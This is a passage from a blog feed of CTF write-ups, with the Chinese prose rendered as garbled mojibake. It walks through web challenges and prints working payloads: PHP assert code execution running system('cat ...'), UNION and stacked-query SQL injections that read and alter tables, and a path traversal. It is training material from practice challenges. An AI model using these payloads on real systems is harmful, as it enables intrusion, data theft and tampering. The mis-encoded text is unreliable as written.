&lt;p&gt;ä¸€å¼€å§‹è¿˜çœ‹ä¸æ‡‚é¢˜ç›®è¦å¹²å˜›ï¼Œç„¶åæŸ¥çœ‹æºä»£ç çœ‹åˆ°ä¸€å † Jsï¼Œç„¶åç”¨è°·æ­Œæ’ä»¶ç¾åŒ–ä¸€ä¸‹ï¼ˆå®‰åˆ©ä¸€ä¸‹ JavaScript and CSS Code Beautifierï¼‰ï¼Œæ–¹ä¾¿çœ‹ä»£ç ã€‚ç„¶åå‘ç°æœ‰ä¸¤ä¸‡è¡Œçš„ä»£ç ã€‚ã€‚ã€‚ã€‚çœ‹ WP çŸ¥é“äº†ç”¨ password å…³é”®è¯æ¥å¼€å§‹å®¡è®¡ã€‚å¤§æ¦‚å°±æ˜¯çŸ©é˜µ A*B=C, å·²çŸ¥ Bï¼ŒC æ±‚ Aã€‚ï¼ˆçº¿ä»£çŸ¥è¯†æ—©å°±å¿˜å¾—å·®ä¸å¤šäº†ï¼‰&lt;/p&gt;
&lt;h2 id=&#34;babyphp&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#babyphp&#34;&gt;#&lt;/a&gt; babyphp&lt;/h2&gt;
&lt;p&gt;æ”»é˜²ä¸–ç•ŒåŸé¢˜ï¼Œå…ˆæ˜¯ githack æ‹¿åˆ°æºç ï¼Œç„¶å assert ä»»æ„ä»£ç æ‰§è¡Œæ‹¿åˆ° flagï¼Œç”¨â€™) é—­åˆç„¶åä»»æ„æ‰§è¡Œä»£ç &lt;br&gt;
 payloadï¼š &lt;code&gt;?page=2&#39;) or system(&amp;quot;cat templates/flag.php&amp;quot;);//&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;inject&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#inject&#34;&gt;#&lt;/a&gt; inject&lt;/h2&gt;
&lt;p&gt;æç¤ºè¯´å…ˆæ‹¿åˆ°æºç å†è¯´ï¼Œçœ‹äº† WP çŸ¥é“è¦è¯•å¸¸è§çš„å¤‡ä»½æ–‡ä»¶åï¼Œå¸¸è§çš„å¤‡ä»½æ–‡ä»¶ä¸´æ—¶æ–‡ä»¶åï¼Œæ¯”å¦‚.bakã€.swpã€.saveã€&lt;sub&gt;ç­‰ï¼Œç„¶åè¿™ä¸€é¢˜æ˜¯åœ¨ index.php&lt;/sub&gt;â€¦ æ‹¿åˆ°æºç &lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs php&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;require&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;config.php&amp;quot;&lt;/span&gt;);&lt;br&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$table&lt;/span&gt; = &lt;span class=&#34;hljs-variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;table&amp;#x27;&lt;/span&gt;]?&lt;span class=&#34;hljs-variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;table&amp;#x27;&lt;/span&gt;]:&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;test&amp;quot;&lt;/span&gt;;&lt;br&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$table&lt;/span&gt; = Filter(&lt;span class=&#34;hljs-variable&#34;&gt;$table&lt;/span&gt;);&lt;br&gt;mysqli_query(&lt;span class=&#34;hljs-variable&#34;&gt;$mysqli&lt;/span&gt;,&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;desc `secret_&lt;span class=&#34;hljs-subst&#34;&gt;&amp;#123;$table&amp;#125;&lt;/span&gt;`&amp;quot;&lt;/span&gt;) &lt;span class=&#34;hljs-keyword&#34;&gt;or&lt;/span&gt; Hacker();&lt;br&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$sql&lt;/span&gt; = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;select &amp;#x27;flag&amp;#123;xxx&amp;#125;&amp;#x27; from secret_&lt;span class=&#34;hljs-subst&#34;&gt;&amp;#123;$table&amp;#125;&lt;/span&gt;&amp;quot;&lt;/span&gt;;&lt;br&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$ret&lt;/span&gt; = sql_query(&lt;span class=&#34;hljs-variable&#34;&gt;$sql&lt;/span&gt;);&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;hljs-variable&#34;&gt;$ret&lt;/span&gt;[&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;];&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p luckyGame~=&#34;&#34;&gt;åº”è¯¥æ˜¯ sql æ³¨å…¥çš„é¢˜ç›®ï¼Œå…ˆæ˜¯è¦æˆåŠŸæ‰§è¡Œ desc  &lt;code&gt;secret_&amp;#123;$table&amp;#125;&lt;/code&gt; ï¼Œç„¶ååˆ©ç”¨ä¸‹é¢çš„ sql è¯­å¥æ‹¿åˆ° flagã€‚desc table_name éœ€è¦è¡¨å­˜åœ¨ï¼Œè¿™æ ·å°±é™åˆ¶äº†æ³¨å…¥ï¼Œå› æ­¤åº”è¯¥å°±æ˜¯è¦åœ¨è¿™é‡Œä¸‹åŠŸå¤«ã€‚&lt;br&gt;
å› ä¸º desc  &lt;code&gt;test&lt;/code&gt;   &lt;code&gt;aaa&lt;/code&gt; , åªè¦ç¬¬ä¸€ä¸ªè¡¨å­˜åœ¨å°±ä¼šæ‰§è¡Œï¼Œä½†æ˜¯å¦‚æœæ˜¯å•å¼•å·å°±ä¸ä¼šæ‰§è¡Œï¼Œè¿™ä¸€è¦è€ƒæ ¸çš„åº”è¯¥å°±æ˜¯è¿™ä¸ªç‚¹ã€‚ç„¶åå°±å¯ä»¥æ„é€  payloadï¼š&amp;quot;?table=test &lt;code&gt; &lt;/code&gt; union select database () limit 1,1&amp;quot; æ‹¿åˆ°æ•°æ®åº“å 61d300ï¼Œæ³¨æ„è¦åŠ  limitï¼Œä¸ç„¶ç›´ä¼šè¿”å› Dã€‚ç„¶åæ„é€  payloadï¼šâ€œ?table=test &lt;code&gt; &lt;/code&gt; union select table_name from information_schema.tables where table_schema=0x363164333030 limit 1,1â€ï¼Œæ‹¿åˆ°è¡¨å secret_flagï¼Œæ³¨æ„ç”¨åå…­è¿›åˆ¶è¿‡ wafã€‚åŒæ ·åŠæ³•æ‹¿åˆ°åˆ—å flagUwillNeverKnowï¼Œç„¶åæ‹¿åˆ° flagï¼šflag&lt;/p&gt;
&lt;h2 id=&#34;phpinfo&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#phpinfo&#34;&gt;#&lt;/a&gt; phpinfo&lt;/h2&gt;
&lt;p&gt;session çš„åºåˆ—åŒ–æ–¹æ³•ä¸åŒå¯¼è‡´çš„æ¼æ´ï¼Œè¿˜æœ‰å°±æ˜¯å¦‚ä½•å¾€ session é‡ŒåŠ å…¥ payload&lt;/p&gt;
&lt;h2 id=&#34;re&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#re&#34;&gt;#&lt;/a&gt; REï¼Ÿ&lt;/h2&gt;
&lt;p&gt;ä¸‹è½½äº†ä¸ª udf.so æ–‡ä»¶ï¼Œä¸çŸ¥é“è¿™æ˜¯å•¥å°±ä¸Šç½‘æœäº†ä¸€ä¸‹ï¼Œ&lt;a href=&#34;https://www.cnblogs.com/sijidou/p/10522972.html&#34;&gt;https://www.cnblogs.com/sijidou/p/10522972.html&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;flagåœ¨ç®¡ç†å‘˜æ‰‹é‡Œ&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#flagåœ¨ç®¡ç†å‘˜æ‰‹é‡Œ&#34;&gt;#&lt;/a&gt; flag åœ¨ç®¡ç†å‘˜æ‰‹é‡Œ&lt;/h2&gt;
&lt;p&gt;å…ˆæŠ“ä¸ªåŒ…ï¼Œçœ‹åˆ° cookie é‡Œæœ‰ä¸€ä¸ª admin=0ï¼Œæ”¹æˆ 1 ä¸è¡Œï¼Œè¿˜æœ‰ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œurl è§£ç ä»¥åå‘ç°æ˜¯ s:5:â€œguestâ€; è¯•ä¸€ä¸‹æ”¹æˆ admin å¾ˆæ˜¾ç„¶ä¹Ÿæ˜¯ä¸è¡Œçš„ï¼Œè¿˜æœ‰å°±æ˜¯ä¸€ä¸ªå“ˆå¸Œå€¼ï¼Œä¼°è®¡ç›´æ¥çˆ†ç ´ä¹Ÿæ˜¯ä¸è¡Œçš„ï¼Œåˆ°è¿™é‡Œå°±æ–­äº†æ€è·¯ã€‚ç„¶åçœ‹ WP è¯´æ‰¾æºç ï¼Œä¸€æ ·çš„ index.php~ æ‹¿åˆ°ä¸€ä¸ªå®è´¨ä¸º.swp çš„ vim å¼‚å¸¸é€€å‡ºæ–‡ä»¶ï¼Œç„¶åå°±åˆ†æä¸€ä¸‹æºç &lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs php&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;&amp;lt;?php&lt;/span&gt; &lt;br&gt;	&lt;span class=&#34;hljs-variable&#34;&gt;$auth&lt;/span&gt; = &lt;span class=&#34;hljs-literal&#34;&gt;false&lt;/span&gt;;&lt;br&gt;	&lt;span class=&#34;hljs-variable&#34;&gt;$role&lt;/span&gt; = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;guest&amp;quot;&lt;/span&gt;;&lt;br&gt;	&lt;span class=&#34;hljs-variable&#34;&gt;$salt&lt;/span&gt; = &lt;br&gt;	&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (&lt;span class=&#34;hljs-keyword&#34;&gt;isset&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$_COOKIE&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;role&amp;quot;&lt;/span&gt;])) &amp;#123;&lt;br&gt;	    &lt;span class=&#34;hljs-variable&#34;&gt;$role&lt;/span&gt; = unserialize(&lt;span class=&#34;hljs-variable&#34;&gt;$_COOKIE&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;role&amp;quot;&lt;/span&gt;]);&lt;br&gt;	    &lt;span class=&#34;hljs-variable&#34;&gt;$hsh&lt;/span&gt; = &lt;span class=&#34;hljs-variable&#34;&gt;$_COOKIE&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;hsh&amp;quot;&lt;/span&gt;];&lt;br&gt;	    &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (&lt;span class=&#34;hljs-variable&#34;&gt;$role&lt;/span&gt;===&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;admin&amp;quot;&lt;/span&gt; &amp;amp;&amp;amp; &lt;span class=&#34;hljs-variable&#34;&gt;$hsh&lt;/span&gt; === md5(&lt;span class=&#34;hljs-variable&#34;&gt;$salt&lt;/span&gt;.strrev(&lt;span class=&#34;hljs-variable&#34;&gt;$_COOKIE&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;role&amp;quot;&lt;/span&gt;]))) &amp;#123;&lt;br&gt;	        &lt;span class=&#34;hljs-variable&#34;&gt;$auth&lt;/span&gt; = &lt;span class=&#34;hljs-literal&#34;&gt;true&lt;/span&gt;;&lt;br&gt;	    &amp;#125; &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt; &amp;#123;&lt;br&gt;	        &lt;span class=&#34;hljs-variable&#34;&gt;$auth&lt;/span&gt; = &lt;span class=&#34;hljs-literal&#34;&gt;false&lt;/span&gt;;&lt;br&gt;	    &amp;#125;&lt;br&gt;	&amp;#125; &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt; &amp;#123;&lt;br&gt;	    &lt;span class=&#34;hljs-variable&#34;&gt;$s&lt;/span&gt; = serialize(&lt;span class=&#34;hljs-variable&#34;&gt;$role&lt;/span&gt;);&lt;br&gt;	    setcookie(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;role&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;hljs-variable&#34;&gt;$s&lt;/span&gt;);&lt;br&gt;	    &lt;span class=&#34;hljs-variable&#34;&gt;$hsh&lt;/span&gt; = md5(&lt;span class=&#34;hljs-variable&#34;&gt;$salt&lt;/span&gt;.strrev(&lt;span class=&#34;hljs-variable&#34;&gt;$s&lt;/span&gt;));&lt;br&gt;	    setcookie(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;hsh&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;hljs-variable&#34;&gt;$hsh&lt;/span&gt;);&lt;br&gt;	&amp;#125;&lt;br&gt;	&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (&lt;span class=&#34;hljs-variable&#34;&gt;$auth&lt;/span&gt;) &amp;#123;&lt;br&gt;	    &lt;span class=&#34;hljs-keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&amp;lt;h3&amp;gt;Welcome Admin. Your flag is &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;	&amp;#125; else &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;	    echo &amp;quot;&lt;/span&gt;&amp;lt;h3&amp;gt;Only Admin can see the flag!!&amp;lt;/h3&amp;gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p H45h_ext3ndeR_i5_easy_to_us3=&#34;&#34;&gt;å¯ä»¥çœ‹åˆ°å“ˆå¸Œå€¼æ˜¯ md5 (salt + åå‘ â€œadminâ€)ï¼›åº”è¯¥æ˜¯å“ˆå¸Œçš„æŸç§æ”»å‡»æ–¹æ³•ã€‚äº†è§£åˆ°åº”è¯¥å¯ä»¥è¿›è¡Œå“ˆå¸Œé•¿åº¦æ‹“å±•æ”»å‡»ã€‚&lt;br&gt;
ï¼ˆå‚è€ƒ https://www.cnblogs.com/pcat/p/5478509.htmlï¼‰&lt;br&gt;
PCTF&lt;/p&gt;
&lt;h2 id=&#34;chopper&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#chopper&#34;&gt;#&lt;/a&gt; Chopper&lt;/h2&gt;
&lt;p&gt;è¿›å…¥ç®¡ç†å‘˜ç™»é™†ç•Œé¢ï¼ŒæŸ¥çœ‹æºä»£ç å‘ç° â€œadmin ip is 202.5.19.128â€ï¼›&lt;/p&gt;
&lt;h2 id=&#34;simple-injection&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#simple-injection&#34;&gt;#&lt;/a&gt; Simple Injection&lt;/h2&gt;
&lt;p&gt;å‘ç°å½“è¾“å…¥çš„è´¦å·æ˜¯ admin çš„æ—¶å€™å›æ˜¾æ˜¯å¯†ç é”™è¯¯ï¼Œè¾“å…¥å…¶ä»–è´¦æˆ·çš„æ—¶å€™å›æ˜¾æ˜¯å¯†ç é”™è¯¯ã€‚å½“è´¦æˆ·åç”¨ adminâ€™ #å‘ç°å¯ä»¥ä½†æ˜¯ç”¨ adminâ€™ and 1=1 #æ—¶è¢«è¿‡æ»¤äº†ï¼Œå†è¯•ä¸€ä¸‹ &lt;code&gt;admin&#39;/**/and/**/&lt;/code&gt;  å‘ç°æ²¡æœ‰è¢«è¿‡æ»¤ï¼Œä¹Ÿå°±æ˜¯è¿™é‡Œå­˜åœ¨æ³¨å…¥ç‚¹ï¼Œæ ¹æ®å›æ˜¾å¯ä»¥å°è¯• bool ç›²æ³¨æˆ–è€…æ—¶é—´ç›²æ³¨ã€‚&lt;br&gt;
ä¸è¿‡çœ‹äº† WP æ‰å‘ç°è¿˜æœ‰ä¸€ç§æ›´ç®€å•çš„æ–¹æ³•&lt;br&gt;
ç›´æ¥ç”¨ payload &lt;code&gt;username=miracle778&#39;/**/union(select(md5(&#39;123&#39;)))#&amp;amp;password=123&lt;/code&gt;  å°±èƒ½æ‹¿åˆ° flag&lt;/p&gt;
</content>
        <updated>2019-11-27T14:22:21.000Z</updated>
    </entry>
    <entry>
        <id>http://blog.m1n.me/2019/11/20/BUUCTF-WP/</id>
        <title>BUUCTF-WP</title>
        <link rel="alternate" href="http://blog.m1n.me/2019/11/20/BUUCTF-WP/"/>
        <content type="html">&lt;p&gt;BUUCTF éƒ¨åˆ†é¢˜è§£&lt;br&gt;
 OJ é“¾æ¥ https://buuoj.cn/challenges&lt;/p&gt;
&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;
&lt;h1 id=&#34;web&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#web&#34;&gt;#&lt;/a&gt; Web&lt;/h1&gt;
&lt;h2 id=&#34;hctf-2018warmup&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#hctf-2018warmup&#34;&gt;#&lt;/a&gt; [HCTF 2018]WarmUp&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;å…ˆæŸ¥çœ‹ç½‘é¡µæºä»£ç ï¼Œå‘ç° source.phpï¼Œå°±è¯»åˆ°äº†æºç ï¼Œç„¶åè¿˜æœ‰ä¸€ä¸ª hint.php å¯ä»¥çœ‹åˆ° flag åœ¨ ffffllllaaaagggg&lt;/li&gt;
&lt;li&gt;åˆ†æä¸€ä¸‹æºç ï¼š&lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&#34;highlight autoit&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs autoit&#34;&gt;$_page = mb_substr(&lt;br&gt;                $page,&lt;br&gt;                &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;,&lt;br&gt;                mb_strpos($page . &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;?&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;?&amp;#x27;&lt;/span&gt;)&lt;br&gt;            )&lt;span class=&#34;hljs-comment&#34;&gt;;&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;å¯ä»¥çœ‹åˆ°å®ƒæ˜¯æ ¹æ®ï¼Ÿçš„ä½ç½®æ¥æˆªå–ï¼Œå› æ­¤å¯ä»¥æ„é€  paylaodï¼š &lt;code&gt;?file=hint.php?../../../../../../../ffffllllaaaagggg&lt;/code&gt;  å°±è¯»åˆ°äº† flag&lt;/p&gt;
&lt;h2 id=&#34;å¼ºç½‘æ¯-2019éšä¾¿æ³¨&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#å¼ºç½‘æ¯-2019éšä¾¿æ³¨&#34;&gt;#&lt;/a&gt; [å¼ºç½‘æ¯ 2019] éšä¾¿æ³¨&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;å…ˆç”¨å•å¼•å·é—­åˆï¼Œå‘ç°æŠ¥é”™ï¼Œç„¶åç”¨ order by æµ‹è¯•å‡ºå­—æ®µæ•°ä¸º 2ï¼Œå†å°è¯• union æ³¨å…¥å‘ç°è¿‡æ»¤ï¼š &lt;code&gt;return preg_match(&amp;quot;/select|update|delete|drop|insert|where|\./i&amp;quot;,$inject);&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;payload: &lt;code&gt;1&#39;;show databases #&lt;/code&gt; æ‹¿åˆ°æ•°æ®åº“å&lt;br&gt;
 array (1) {&lt;br&gt;
[0]=&amp;gt;&lt;br&gt;
string(11) â€œctftrainingâ€&lt;br&gt;
}&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;array(1) {&lt;br&gt;
[0]=&amp;gt;&lt;br&gt;
string(18) â€œinformation_schemaâ€&lt;br&gt;
}&lt;/p&gt;
&lt;p&gt;array(1) {&lt;br&gt;
[0]=&amp;gt;&lt;br&gt;
string(5) â€œmysqlâ€&lt;br&gt;
}&lt;/p&gt;
&lt;p&gt;array(1) {&lt;br&gt;
[0]=&amp;gt;&lt;br&gt;
string(18) â€œperformance_schemaâ€&lt;br&gt;
}&lt;/p&gt;
&lt;p&gt;array(1) {&lt;br&gt;
[0]=&amp;gt;&lt;br&gt;
string(9) â€œsupersqliâ€&lt;br&gt;
}&lt;/p&gt;
&lt;p&gt;array(1) {&lt;br&gt;
[0]=&amp;gt;&lt;br&gt;
string(4) â€œtestâ€&lt;br&gt;
}&lt;br&gt;
3.  &lt;code&gt;1&#39;; show tables from ctftraining #&lt;/code&gt; æ‹¿åˆ°è¡¨å&lt;br&gt;
 array (1) {&lt;br&gt;
[0]=&amp;gt;&lt;br&gt;
string(10) â€œFLAG_TABLEâ€&lt;br&gt;
}&lt;/p&gt;
&lt;p&gt;array(1) {&lt;br&gt;
[0]=&amp;gt;&lt;br&gt;
string(4) â€œnewsâ€&lt;br&gt;
}&lt;/p&gt;
&lt;p&gt;array(1) {&lt;br&gt;
[0]=&amp;gt;&lt;br&gt;
string(5) â€œusersâ€&lt;br&gt;
}&lt;br&gt;
4.  &lt;code&gt;1&#39;;show columns from ctftraining.FLAG_TABLE #&lt;/code&gt; å‘ç°ä¸è¡Œï¼Œè¢«è¿‡æ»¤äº†ï¼Ÿï¼Ÿ&lt;br&gt;
5.  &lt;code&gt;1&#39;;show tables #&lt;/code&gt; çœ‹åˆ°æœ‰ä¸¤ä¸ªè¡¨&lt;/p&gt;
&lt;p&gt;array(1) {&lt;br&gt;
[0]=&amp;gt;&lt;br&gt;
string(16) â€œ1919810931114514â€&lt;br&gt;
}&lt;/p&gt;
&lt;p&gt;array(1) {&lt;br&gt;
[0]=&amp;gt;&lt;br&gt;
string(5) â€œwordsâ€&lt;br&gt;
}&lt;br&gt;
 6. åˆ†åˆ«æŸ¥çœ‹ words å’Œ 1919810931114514 é‡Œé¢æœ‰äº›ä»€ä¹ˆ&lt;/p&gt;
&lt;p&gt;&lt;code&gt;1&#39;;show columns from words #&lt;/code&gt; :array(6) {&lt;br&gt;
[0]=&amp;gt;&lt;br&gt;
string(2) â€œidâ€&lt;br&gt;
[1]=&amp;gt;&lt;br&gt;
string(7) â€œint(10)â€&lt;br&gt;
[2]=&amp;gt;&lt;br&gt;
string(2) â€œNOâ€&lt;br&gt;
[3]=&amp;gt;&lt;br&gt;
string(0) â€œâ€&lt;br&gt;
[4]=&amp;gt;&lt;br&gt;
NULL&lt;br&gt;
[5]=&amp;gt;&lt;br&gt;
string(0) â€œâ€&lt;br&gt;
}&lt;/p&gt;
&lt;p&gt;array(6) {&lt;br&gt;
[0]=&amp;gt;&lt;br&gt;
string(4) â€œdataâ€&lt;br&gt;
[1]=&amp;gt;&lt;br&gt;
string(11) â€œvarchar(20)â€&lt;br&gt;
[2]=&amp;gt;&lt;br&gt;
string(2) â€œNOâ€&lt;br&gt;
[3]=&amp;gt;&lt;br&gt;
string(0) â€œâ€&lt;br&gt;
[4]=&amp;gt;&lt;br&gt;
NULL&lt;br&gt;
[5]=&amp;gt;&lt;br&gt;
string(0) â€œâ€&lt;br&gt;
}&lt;br&gt;
 &lt;code&gt;1&#39;;show columns from &lt;/code&gt; 1919810931114514 &lt;code&gt; #&lt;/code&gt; ï¼ˆæ³¨æ„è¿™é‡Œè¦åŠ åå¼•å·ï¼‰ï¼šarray (6) {&lt;br&gt;
[0]=&amp;gt;&lt;br&gt;
string(4) â€œflagâ€&lt;br&gt;
[1]=&amp;gt;&lt;br&gt;
string(12) â€œvarchar(100)â€&lt;br&gt;
[2]=&amp;gt;&lt;br&gt;
string(2) â€œNOâ€&lt;br&gt;
[3]=&amp;gt;&lt;br&gt;
string(0) â€œâ€&lt;br&gt;
[4]=&amp;gt;&lt;br&gt;
NULL&lt;br&gt;
[5]=&amp;gt;&lt;br&gt;
string(0) â€œâ€&lt;br&gt;
} çœ‹åˆ°äº†æœ‰ flag&lt;br&gt;
7. æ¥ä¸‹æ¥æ€ä¹ˆè¯»åˆ° flag å°±æ˜¯å…³é”®äº†&lt;/p&gt;
&lt;figure class=&#34;highlight applescript&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs applescript&#34;&gt;&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;&amp;#x27;; alter table &lt;span class=&#34;hljs-built_in&#34;&gt;words&lt;/span&gt; rename &lt;span class=&#34;hljs-keyword&#34;&gt;to&lt;/span&gt; words1;alter table `&lt;span class=&#34;hljs-number&#34;&gt;1919810931114514&lt;/span&gt;` rename &lt;span class=&#34;hljs-keyword&#34;&gt;to&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;words&lt;/span&gt;;alter table &lt;span class=&#34;hljs-built_in&#34;&gt;words&lt;/span&gt; change flag &lt;span class=&#34;hljs-built_in&#34;&gt;id&lt;/span&gt; varchar(&lt;span class=&#34;hljs-number&#34;&gt;50&lt;/span&gt;);&lt;span 